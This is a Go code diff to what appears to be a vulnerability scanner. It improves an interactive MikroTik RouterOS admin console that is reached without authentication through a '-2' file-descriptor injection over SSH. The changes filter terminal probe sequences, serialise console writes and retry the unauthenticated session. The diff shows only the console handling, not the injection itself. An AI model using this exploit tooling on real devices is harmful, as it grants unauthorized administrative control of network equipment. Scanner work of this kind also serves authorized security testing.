@@ -9,6 +9,7 @@ import (
 	"os"
 	"regexp"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/term"
@@ -56,6 +57,69 @@ func mikrotikFD2Squashed(raw []byte) string {
 	plain := mikrotikFD2ANSIRe.ReplaceAll(raw, nil)
 	plain = bytes.ReplaceAll(plain, []byte("\r"), nil)
 	return strings.Join(strings.Fields(string(plain)), "")
+}
+
+// mikrotikFD2QuerySeqs are the terminal-query escape sequences the RouterOS
+// console emits to probe the terminal. We answer them ourselves and keep them
+// off the user's terminal; otherwise the terminal emulator replies on stdin,
+// corrupting the command stream and eventually closing the session.
+var mikrotikFD2QuerySeqs = [][]byte{
+	[]byte("\x1b[6n"), // DSR: report cursor position
+	[]byte("\x1bZ"),   // DECID: report device attributes
+}
+
+// mikrotikFD2TerminalFilter removes the query sequences from console output
+// before it is displayed. It tolerates sequences split across calls by
+// buffering trailing bytes that could begin a query.
+type mikrotikFD2TerminalFilter struct {
+	pend []byte
+}
+
+func (f *mikrotikFD2TerminalFilter) maxSeq() int {
+	m := 0
+	for _, q := range mikrotikFD2QuerySeqs {
+		if len(q) > m {
+			m = len(q)
+		}
+	}
+	return m
+}
+
+func (f *mikrotikFD2TerminalFilter) Filter(p []byte) []byte {
+	buf := append(f.pend, p...)
+	f.pend = f.pend[:0]
+	maxSeq := f.maxSeq()
+	out := make([]byte, 0, len(buf))
+	for len(buf) > 0 {
+		stripped := false
+		for _, q := range mikrotikFD2QuerySeqs {
+			if bytes.HasPrefix(buf, q) {
+				buf = buf[len(q):]
+				stripped = true
+				break
+			}
+		}
+		if stripped {
+			continue
+		}
+		// Hold back a trailing run that could begin a query sequence.
+		if len(buf) < maxSeq && f.isPrefix(buf) {
+			f.pend = append(f.pend, buf...)
+			break
+		}
+		out = append(out, buf[0])
+		buf = buf[1:]
+	}
+	return out
+}
+
+func (f *mikrotikFD2TerminalFilter) isPrefix(b []byte) bool {
+	for _, q := range mikrotikFD2QuerySeqs {
+		if len(b) < len(q) && bytes.HasPrefix(q, b) {
+			return true
+		}
+	}
+	return false
 }
 
 // mikrotikFD2Options builds the base auth options that perform the
@@ -110,7 +174,7 @@ func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *au
 		return nil
 	}
 
-	res := auth.SSHAuth(addr, mikrotikFD2Options(addr, conf, options).WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
+	handler := func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
 		_ = c.SetDeadline(time.Time{})
 		defer sclient.Close()
 
@@ -126,13 +190,25 @@ func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *au
 		fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
 		fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")
 
-		// Relay console output to the terminal while answering the DECID/CPR
-		// probes the console uses to size itself.
+		// The RouterOS console is a PTY that emits DECID/CPR sizing probes.
+		// We answer those ourselves and strip them from the output before it
+		// reaches the user's terminal; otherwise the terminal emulator would
+		// answer the probes on stdin, corrupting the command stream and
+		// eventually closing the session.
+		var inMu sync.Mutex
+		writeConsole := func(b []byte) error {
+			inMu.Lock()
+			defer inMu.Unlock()
+			_, err := stdIn.Write(b)
+			return err
+		}
+
 		stop := make(chan struct{})
 		defer close(stop)
 		go func() {
 			tick := time.NewTicker(time.Millisecond * 50)
 			defer tick.Stop()
+			var filter mikrotikFD2TerminalFilter
 			emitted := 0
 			cprAnswered := 0
 			decidAnswered := false
@@ -143,22 +219,25 @@ func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *au
 				case <-tick.C:
 				}
 				raw := stdOut.Peek()
-				if len(raw) > emitted {
-					_, _ = os.Stdout.Write(raw[emitted:])
-					os.Stdout.Sync()
-					emitted = len(raw)
-				}
+				delta := raw[emitted:]
+				emitted = len(raw)
+
 				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
 					decidAnswered = true
-					_, _ = stdIn.Write([]byte("\x1b[?1;2c"))
+					_ = writeConsole([]byte("\x1b[?1;2c"))
 				}
 				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
 					for cprAnswered < n {
 						cprAnswered++
-						if _, err := stdIn.Write([]byte("\x1b[24;80R")); err != nil {
+						if err := writeConsole([]byte("\x1b[24;80R")); err != nil {
 							return
 						}
 					}
+				}
+
+				if out := filter.Filter(delta); len(out) > 0 {
+					_, _ = os.Stdout.Write(out)
+					os.Stdout.Sync()
 				}
 			}
 		}()
@@ -180,11 +259,24 @@ func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *au
 			case "exit", "quit", ".":
 				return nil
 			}
-			if _, err := stdIn.Write([]byte(line + "\r")); err != nil {
+			if err := writeConsole([]byte(line + "\r")); err != nil {
 				return err
 			}
 		}
-	}), auth.SSHAuthHandlerSingle(ssh.None()))
+	}
+
+	// Re-establish the unauthenticated console. The first attempt can fail at
+	// channel open if the RouterOS login helper is still tearing down the
+	// detection session's console, so retry a few times with a short delay.
+	var res *auth.AuthResult
+	for attempt := 1; attempt <= 3; attempt++ {
+		res = auth.SSHAuth(addr, mikrotikFD2Options(addr, conf, options).WithSessionHandler(handler), auth.SSHAuthHandlerSingle(ssh.None()))
+		if res.Stage == "session" {
+			break
+		}
+		conf.Logger.Debugf("%s %s interact reconnect attempt %d failed (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
+		time.Sleep(time.Second * 2)
+	}
 
 	return res
 }
